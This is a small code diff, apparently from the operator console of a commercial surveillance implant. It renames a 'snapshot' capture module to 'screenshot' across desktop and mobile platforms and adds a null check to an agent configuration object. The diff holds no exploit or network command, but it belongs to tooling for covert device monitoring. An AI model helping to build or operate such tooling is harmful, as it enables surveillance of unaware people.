@@ -135,7 +135,7 @@ package it.ht.rcs.console.operations.view.configuration
         },
         
         {
-          module: "snapshot",
+          module: "screenshot",
           _type: "desktop,mobile",
           _platform: "windows,osx,ios,blackberry,winmo,symbian,android"
         },
@@ -173,7 +173,7 @@ package it.ht.rcs.console.operations.view.configuration
       var globals:Object = {
                              quota: { "min": 524288000, "max": 1048576000 },
                              wipe: false,
-                             type: agent.type,
+                             type: agent?agent.type:'',
                              advanced: false
                            };
       
